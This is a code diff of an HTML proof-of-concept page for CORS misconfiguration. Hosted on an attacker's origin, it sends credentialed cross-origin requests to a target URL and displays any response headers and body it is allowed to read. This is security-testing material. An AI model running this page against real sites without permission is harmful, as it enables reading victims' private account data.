@@ -3,121 +3,114 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CORS Exploit</title>
+  <title>CORS PoC (attacker-origin page)</title>
   <style>
-    body {
-      font-family: monospace;
-      margin: 20px;
-      font-size: 14px;
-    }
-    input[type="text"], input[type="url"] {
-      padding: 10px;
-      margin: 10px 0;
-      width: 300px;
+    body { font-family: monospace; margin: 20px; font-size: 14px; max-width: 900px; }
+    input[type="text"], input[type="url"], select {
+      padding: 8px; margin: 8px 0; width: min(100%, 480px); box-sizing: border-box;
     }
     button {
-        margin-top: 10px;
-      padding: 4px 10px;
-      font-size: 16px;
-      background-color: #e31624;
-      color: white;
-      border: none;
-      cursor: pointer;
+      margin-top: 10px; margin-right: 8px; padding: 6px 12px; font-size: 14px;
+      background-color: #e31624; color: white; border: none; cursor: pointer;
     }
-    button:hover {
-      background-color: #45a049;
-    }
-    .result {
-      margin-top: 20px;
-      padding: 10px;
-      border: 1px solid #ddd;
-      background-color: #f9f9f9;
-    }
-    .error {
-      color: red;
-    }
-    .success {
-      color: green;
-    }
-    #reset-btn {
-      margin-top: 10px;
-      padding: 4px 10px;
-      font-size: 16px;
-      background-color: #080505;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
+    button.secondary { background-color: #080505; }
+    button:hover { opacity: 0.9; }
+    .result { margin-top: 20px; padding: 10px; border: 1px solid #ddd; background: #f9f9f9; white-space: pre-wrap; }
+    .error { color: #b00020; }
+    .success { color: #0a7a28; }
+    .note { background: #fff8e1; border: 1px solid #ffe082; padding: 12px; margin: 16px 0; }
+    code { background: #eee; padding: 1px 4px; }
   </style>
 </head>
 <body>
+  <h1>CORS exploit PoC</h1>
 
-  <h1>CORS Exploit</h1>
-  <p>Enter the vulnerable URL to perform CORS exploit.</p>
+  <div class="note">
+    <strong>Important:</strong> browsers ignore a forged <code>Origin</code> header set from JavaScript.
+    Host this page on an origin you control (or open it from a local server on a chosen host/port).
+    The browser will send <em>this page’s origin</em> automatically. For arbitrary Origin values,
+    use the CLI: <code>python cors_check.py -u https://target/api</code>
+  </div>
 
-  <label for="target-url">Vulnerable URL:</label>
-  <input type="url" id="target-url" placeholder="https://vulnerable-site.com/api" required><br>
+  <p>Current page origin: <strong id="page-origin"></strong></p>
 
-  <label for="attacker-origin">Attacker's Origin (e.g., http://attacker.com):</label>
-  <input type="text" id="attacker-origin" value="http://attacker.com" required><br>
+  <label for="target-url">Vulnerable URL:</label><br>
+  <input type="url" id="target-url" placeholder="https://vulnerable-site.com/api/me" required><br>
 
-  <button onclick="exploitCORS()">Exploit</button>
-    <!-- Reset Button -->
-    <button id="reset-btn" onclick="resetFields()">Reset</button>
+  <label for="method">Method:</label><br>
+  <select id="method">
+    <option>GET</option>
+    <option>POST</option>
+  </select><br>
+
+  <label>
+    <input type="checkbox" id="with-creds"> Include credentials (cookies)
+  </label><br>
+
+  <button onclick="exploitCORS()">Send request</button>
+  <button class="secondary" id="reset-btn" onclick="resetFields()">Reset</button>
 
   <div id="result" class="result"></div>
 
   <script>
+    document.getElementById('page-origin').textContent = window.location.origin;
+
     async function exploitCORS() {
-      const targetUrl = document.getElementById('target-url').value;
-      const attackerOrigin = document.getElementById('attacker-origin').value;
+      const targetUrl = document.getElementById('target-url').value.trim();
+      const method = document.getElementById('method').value;
+      const withCreds = document.getElementById('with-creds').checked;
       const resultDiv = document.getElementById('result');
 
-      if (!targetUrl || !attackerOrigin) {
-        resultDiv.innerHTML = "<p class='error'>Please provide a valid URL and attacker origin.</p>";
+      if (!targetUrl) {
+        resultDiv.innerHTML = "<p class='error'>Provide a target URL.</p>";
         return;
       }
 
-      resultDiv.innerHTML = "<p>Sending CORS request...</p>";
+      resultDiv.textContent = "Sending CORS request from origin " + window.location.origin + " ...";
 
       try {
         const response = await fetch(targetUrl, {
-          method: 'GET',
+          method,
           mode: 'cors',
-          headers: {
-            'Origin': attackerOrigin // Set the malicious origin
-          }
+          credentials: withCreds ? 'include' : 'omit',
         });
 
-        if (response.ok) {
-          const text = await response.text();
-          const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
-          
-          if (allowedOrigin === attackerOrigin || allowedOrigin === '*') {
-            resultDiv.innerHTML = `
-              <p class='success'>[+] Vulnerable! The server allowed the origin: ${allowedOrigin}</p>
-              <p><strong>Response Data:</strong></p>
-              <pre>${text}</pre>
-            `;
-          } else {
-            resultDiv.innerHTML = "<p class='error'>[-] The server did not allow the attacker's origin.</p>";
-          }
-        } else {
-          resultDiv.innerHTML = `<p class='error'>[-] Error: ${response.status} ${response.statusText}</p>`;
+        const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
+        const acac = response.headers.get('Access-Control-Allow-Credentials');
+        const text = await response.text();
+
+        // Escape HTML for safe display
+        const esc = (s) => String(s)
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;');
+
+        let verdict = 'Server responded; inspect ACAO/ACAC below.';
+        let cls = '';
+        if (allowedOrigin === '*' || allowedOrigin === window.location.origin) {
+          verdict = '[+] Interesting: ACAO reflects this origin or is wildcard.';
+          cls = 'success';
         }
+
+        resultDiv.innerHTML = `
+          <p class="${cls}">${esc(verdict)}</p>
+          <p>HTTP ${response.status} ${esc(response.statusText)}</p>
+          <p>ACAO: ${esc(allowedOrigin)}</p>
+          <p>ACAC: ${esc(acac)}</p>
+          <p><strong>Body (truncated):</strong></p>
+          <pre>${esc(text.slice(0, 8000))}</pre>
+        `;
       } catch (error) {
-        resultDiv.innerHTML = `<p class='error'>[!] Error: ${error.message}</p>`;
+        resultDiv.innerHTML = `<p class="error">[!] ${String(error.message || error)}
+          (often means CORS blocked the response from JS — may still be worth checking with cors_check.py)</p>`;
       }
     }
+
     function resetFields() {
-      // Reset the input fields
       document.getElementById('target-url').value = '';
-      document.getElementById('attacker-origin').value = 'http://attacker.com';
-      
-      // Clear the result area
+      document.getElementById('with-creds').checked = false;
       document.getElementById('result').innerHTML = '';
     }
   </script>
-
 </body>
 </html>
